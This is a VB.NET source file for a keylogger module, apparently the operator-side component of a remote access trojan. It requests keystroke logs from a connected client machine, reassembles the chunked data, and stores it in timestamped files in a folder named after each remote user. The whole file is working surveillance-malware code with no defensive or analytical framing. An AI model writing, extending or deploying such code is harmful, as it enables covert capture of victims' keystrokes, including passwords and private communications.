Imports System.IO

Public Class clsKeylogger
    'Public
    Inherits clsBoneObj

    Private currentLogBytes As Byte() = New Byte() {}

    Private InfoObj As clsInfo = Nothing

    Public Sub New(ByVal mConn As clsConnection, ByVal mInfoObj As clsInfo)
        Conn = mConn
        InfoObj = mInfoObj
    End Sub

    Public Overrides Sub OnInit()
        ObjID = 2
    End Sub

    Public Overrides Sub OnPacketArrived(ByVal packet() As Byte)
        Dim ID As Byte = packet(0)
        Dim BinReader As clsArrayBinaryReader = New clsArrayBinaryReader()
        Dim BinWriter As clsArrayBinaryWritten = New clsArrayBinaryWritten()

        If ID = 0 Then

            Dim totalSize As Integer = BinReader.BufferReadDWORD(packet, 1)
            Dim sizeLeft As Integer = BinReader.BufferReadDWORD(packet, 5)
            Dim chunkSize As Integer = BinReader.BufferReadDWORD(packet, 9)
            BinWriter.BufferMerge(currentLogBytes, BinReader.BufferReadBuffer(packet, 13, chunkSize))
            If currentLogBytes.Length >= totalSize Then
                Dim keylogPath As String = GetKeylogPath()

                If (Not Directory.Exists(keylogPath)) Then
                    Directory.CreateDirectory(keylogPath)
                    Return
                End If

                Using outFile As New System.IO.FileStream(keylogPath & System.DateTime.Now.ToString("dd-MM-yyyy HH-mm-ss") & ".txt", IO.FileMode.Create, IO.FileAccess.Write)
                    outFile.Write(currentLogBytes, 0, currentLogBytes.Length)
                    currentLogBytes = New Byte() {}
                End Using
            End If
        End If
    End Sub

    Public Overrides Sub OnExit()

    End Sub

    Public Sub GetLog()
        Dim BinWriter As clsArrayBinaryWritten = New clsArrayBinaryWritten
        Dim packet As Byte() = New Byte() {}

        BinWriter.BufferAddByte(packet, 0)
        SendPacket(packet)
    End Sub

    Public Function GetKeylogPath() As String
        Return Application.StartupPath + "\Users\" + InfoObj.GetClientInfo.computerUserName.Replace("/", "@").Replace(Convert.ToChar(0), "") + "\Keylogs\"
    End Function
End Class
